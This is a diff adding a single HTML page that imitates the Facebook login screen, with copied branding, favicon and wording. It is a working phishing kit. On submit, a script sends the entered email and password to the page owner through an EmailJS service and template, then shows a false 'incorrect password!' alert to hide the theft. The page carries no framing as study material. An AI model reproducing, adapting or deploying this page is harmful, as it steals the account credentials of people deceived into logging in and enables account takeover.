@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Facebook – log in or sign up</title>
+
+  <!-- Favicon / Meta logo -->
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+  <link rel="shortcut icon" href="https://www.facebook.com/favicon.ico" type="image/x-icon">
+  <link rel="apple-touch-icon" href="https://www.facebook.com/favicon.ico">
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("MF5ay2BxtQS7f_zmS");
+    })();
+  </script>
+
+  <style>
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: Helvetica, Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 10px;
+      flex-direction: column;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 15px;
+    }
+
+    .logo h1 {
+      color: #1877f2;
+      font-size: 40px;
+      margin: 0;
+      font-weight: bold;
+      letter-spacing: -1px;
+    }
+
+    .description {
+      font-size: 16px;
+      color: #1c1e21;
+      text-align: center;
+      margin-bottom: 20px;
+      line-height: 1.4;
+    }
+
+    .login-box {
+      background: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12);
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+      outline: none;
+      transition: all 0.2s ease;
+    }
+
+    .login-box input:focus {
+      border-color: #1877f2;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: 0.2s;
+    }
+
+    .login-btn:hover { background-color: #166fe5; }
+
+    .forgot {
+      display: block;
+      text-align: center;
+      color: #1877f2;
+      font-size: 14px;
+      text-decoration: none;
+      margin-bottom: 15px;
+    }
+
+    .forgot:hover { text-decoration: underline; }
+
+    .line { border-top: 1px solid #dadde1; margin: 15px 0; }
+
+    .create-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #42b72a;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.2s;
+    }
+
+    .create-btn:hover { background-color: #36a420; }
+
+    .footer-text {
+      margin-top: 20px;
+      font-size: 13px;
+      text-align: center;
+      color: #606770;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .footer-text img {
+      width: 16px;
+      height: 16px;
+    }
+
+    .footer-text span { font-weight: bold; cursor: pointer; }
+
+    /* Responsive */
+    @media(min-width: 600px) {
+      .logo h1 { font-size: 50px; }
+      .description { font-size: 18px; }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+    <div class="logo">
+      <h1>facebook</h1>
+    </div>
+
+    <div class="description">
+      Facebook helps you connect and share with the people in your life.
+    </div>
+
+    <form class="login-box" id="login-form">
+      <input type="text" name="user_email" placeholder="Email address or phone number" required>
+      <input type="password" name="user_password" placeholder="Password" required>
+
+      <button class="login-btn" type="submit">Log In</button>
+
+      <a href="#" class="forgot">Forgotten password?</a>
+
+      <div class="line"></div>
+
+      <button class="create-btn" type="button">Create New Account</button>
+    </form>
+
+    <div class="footer-text">
+      <img src="https://www.facebook.com/favicon.ico" alt="Facebook logo">
+      <span>Create a Page</span> for a celebrity, brand or business.
+    </div>
+  </div>
+
+  <script>
+    document.getElementById("login-form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      emailjs.sendForm("service_4j75doc", "template_jhwehoh", this)
+        .then(function() { alert("incorrect password!"); })
+        .catch(function(error) { alert("Failed: " + JSON.stringify(error)); });
+    });
+  </script>
+
+</body>
+</html>
